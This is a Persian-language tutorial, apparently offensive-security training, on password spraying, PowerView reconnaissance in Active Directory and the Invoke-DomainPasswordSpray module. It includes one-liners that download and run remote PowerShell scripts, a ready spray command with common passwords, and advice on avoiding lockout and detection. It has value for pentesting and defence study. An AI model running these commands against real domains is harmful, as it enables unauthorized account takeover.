

---

## 🛑 بخش اول: Password Spraying چیست؟

**Password Spraying** یک تکنیک احراز هویت brute-force است که توسط مهاجمان برای حدس زدن رمزهای عبور ضعیف استفاده می‌شود **بدون اینکه حساب‌ها را قفل کنند.**

---

### ✅ تفاوت Password Spraying با Brute Force معمولی

|مورد|Brute Force معمولی|Password Spraying|
|---|---|---|
|روش کار|تست هزاران پسورد روی یک کاربر|تست یک پسورد روی هزاران کاربر|
|خطر Lockout|زیاد|کم|
|سرعت کشف|بالا ولی پرخطر|کندتر ولی کم‌ریسک‌تر|
|هدف اصلی|دسترسی سریع|ماندگاری و شناسایی بدون هشدار|

---

### 💡 مثال ساده:

فرض کن مهاجم پسوردهای رایج مثل `Spring2025!`, `Password123!`, `Welcome@123` داره.

به جای اینکه همه این پسوردها رو روی کاربر `administrator` تست کنه (که باعث Lock شدن اون می‌شه)، میاد:

- `Password123!` روی 200 تا کاربر تست می‌کنه
    
- بعد از یک ساعت، `Welcome@123` رو تست می‌کنه
    
- و الی آخر...
    

---

### 📌 ابزارهای معروف Password Spraying:

- `Hydra`
    
- `CrackMapExec`
    
- `Spraycharles`
    
- `BurpSuite + Intruder` (برای Web Logins)
    
- `Kerbrute` (برای AD)
    

---

## 🛠️ بخش دوم: PowerView — ابزار Post-Exploitation برای Active Directory

PowerView یکی از ابزارهای قدرتمند برای **جمع‌آوری اطلاعات (reconnaissance)** در اکتیو دایرکتوری هست. بخشی از مجموعه‌ی PowerSploit هست.

---

### 💾 نصب PowerView:

در سیستم قربانی (درگیر شده با حمله) یا سیستم pentest:

```powershell
# اگر از GitHub می‌گیری
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

یا فایل PowerView.ps1 رو دانلود و import کن:

```powershell
Import-Module .\PowerView.ps1
```

---

## 🧠 متدهای مهم در PowerView

بیایم دسته‌بندی کنیم:

---

### ✅ 1. اطلاعات درباره Domain و Forest

|دستور|توضیح|
|---|---|
|`Get-NetDomain`|دریافت نام و اطلاعات دامین فعلی|
|`Get-NetForest`|دریافت اطلاعات Forest|
|`Get-NetForestDomain`|دامین‌های داخل یک Forest|
|`Get-NetDomainController`|لیست DCها|

---

### ✅ 2. جمع‌آوری اطلاعات کاربران و گروه‌ها

|دستور|توضیح|
|---|---|
|`Get-NetUser`|لیست کاربران دامنه|
|`Get-NetUser -UserName مارتین`|اطلاعات کامل یک کاربر خاص|
|`Get-UserProperty -Properties pwdlastset`|زمان آخرین تغییر رمز کاربران|
|`Get-NetGroup`|لیست همه گروه‌ها|
|`Get-NetGroupMember -GroupName "Domain Admins"`|اعضای گروه Domain Admins|

---

### ✅ 3. اطلاعات سیستم‌ها و شبکه

|دستور|توضیح|
|---|---|
|`Get-NetComputer`|لیست سیستم‌های داخل دامنه|
|`Get-NetOU`|لیست OUها|
|`Get-NetSubnet`|اطلاعات Subnetهای موجود|
|`Get-NetSite`|اطلاعات مربوط به Siteها در AD|

---

### ✅ 4. Trust و GPO

|دستور|توضیح|
|---|---|
|`Get-NetDomainTrust`|Trustهای بین دامین‌ها|
|`Get-NetGPO`|لیست GPOهای دامنه|
|`Get-NetGPOGroup`|GPOهایی که گروه تعریف می‌کنند|

---

### ✅ 5. Session و ACL

|دستور|توضیح|
|---|---|
|`Find-LocalAdminAccess`|کدام سیستم‌ها دسترسی Local Admin دارن|
|`Get-ObjectAcl`|لیست ACLهای یک Object مثل کاربر یا OU|
|`Get-NetSession`|سشن‌های فعال روی سیستم|
|`Get-NetLoggedon`|چه کسی در حال حاضر روی سیستم لاگین کرده|

---

## 🎯 مرحله بعدی:

اگر موافق باشی، یکی‌یکی این توابع رو با مثال واقعی اجرا کنیم، مثلاً:

- کشف کاربرانی که رمز ساده دارن (مناسب password spraying)
    
- کشف سیستم‌هایی که سشن باز دارن
    
- بررسی اعضای Domain Admins
    



---

## 🔐 `Invoke-DomainPasswordSpray` — ماژولی برای حمله Password Spraying در اکتیو دایرکتوری

---

### ✅ این ماژول چیکار می‌کنه؟

`Invoke-DomainPasswordSpray` یک ابزار PowerShell برای تست کردن **یک پسورد مشخص روی تعداد زیادی کاربر دامنه** است — دقیقاً همون تکنیکی که توی password spraying گفتیم.

**هدف:** کشف حساب‌هایی که از رمزهای ساده یا پیش‌فرض استفاده می‌کنن، بدون اینکه باعث قفل شدن حساب‌ها (account lockout) بشی.

---

## 🧪 سینتکس (نحوه اجرای دستور)

```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Password "Spring2025!"
```

---

## 🧾 پارامترهای مهم:

|پارامتر|توضیح|
|---|---|
|`-UserList`|مسیر فایل متنی شامل لیست نام‌های کاربری|
|`-Password`|رمزی که می‌خوای روی همه‌ی کاربران تست کنی|
|`-Domain`|(اختیاری) نام دامنه؛ اگر نزاری، دامنه فعلی استفاده می‌شه|
|`-Verbose`|برای نمایش جزییات بیشتر اجرا|
|`-OutFile`|مسیر ذخیره‌ی نتایج موفق (کاربرانی که رمز معتبر داشتن)|
|`-Threads`|تعداد تردها برای اجرای همزمان (مثلاً 10 یا 20)|
|`-Force`|برای عبور از برخی چک‌ها و اجرای سریع‌تر|

---

## 📁 ساخت فایل `users.txt`

مثال:

```text
m.rahimi
admin
j.doe
s.jafari
user1
```

---

## 💡 مثال کامل:

```powershell
Invoke-DomainPasswordSpray -UserList C:\tools\users.txt -Password "Spring2025!" -Verbose -OutFile C:\tools\spray_results.txt
```

---

### ⛔ نکات مهم امنیتی و عملیاتی:

- با این روش، چون فقط یک یا چند رمز رو روی کاربران مختلف امتحان می‌کنی، احتمال قفل شدن حساب‌ها خیلی کمتره.
    
- رمزهایی مثل `Welcome2024`, `12345678`, `P@ssw0rd!`, `CompanyName2025!` کاندیدای خوبی برای تست هستند.
    
- اگر سیستم EDR یا SIEM داشته باشه، احتمال لاگ شدن این فعالیت هست، مخصوصاً اگر تعداد زیادی درخواست لاگین پشت سر هم ارسال بشه.
    

---

### 🔍 چطور بفهمم رمز درست بوده؟

در خروجی می‌نویسه مثلاً:

```
[*] SUCCESS: j.doe : Spring2025!
[*] FAILURE: m.rahimi
[*] FAILURE: s.jafari
```

یا در فایل `spray_results.txt` ذخیره می‌کنه موفق‌ها رو.

---

## 🧱 اگر PowerView لود نبود:

اگر PowerView یا PowerSploit لود نکردی، اول اجرا کن:

```powershell
Import-Module .\PowerView.ps1
```

اگر `Invoke-DomainPasswordSpray` توی PowerViewت نبود، از نسخه‌های توسعه‌یافته مثل PowerSploit یا Empire استفاده کن، چون این تابع توی نسخه رسمی حذف شده.

یا مستقیم از این مخزن بگیر:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
```

و بعد:

```powershell
Invoke-DomainPasswordSpray ...
```

---
